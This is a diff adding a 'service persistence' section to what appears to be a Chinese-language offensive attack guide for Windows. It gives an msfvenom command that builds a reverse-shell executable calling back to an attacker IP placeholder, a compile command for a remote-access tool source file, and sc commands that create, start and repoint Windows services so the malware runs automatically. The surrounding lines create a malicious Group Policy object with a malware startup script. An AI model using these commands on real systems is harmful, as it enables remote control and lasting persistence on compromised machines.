@@ -836,3 +836,24 @@ $GPO = $GPDomain.CreateGPO("MaliciousGPO")
 $GPO.SetSecurityDescriptor("O:BAG:BAD:(A;;GA;;;BA)")
 $GPO.SetStartupScript("C:\Path\To\Malware.bat")
 ```
+
+### 服务持久化
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP地址 LPORT=4444 -f exe > msf.exe
+```
+
+[windows_server.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/windows_server.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 windows_server.cpp -o windows_server.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+```Bash
+sc create GhostWolfLab binpath= "C:\Users\snowwolf\Desktop\rat\pre\windows_server.exe start= auto
+sc query GhostWolfLab
+sc start GhostWolfLab
+sc config ExistingService binPath= "C:\Path\To\Malware.exe"
+sc stop 服务名称
+sc delete 服务名称
+```
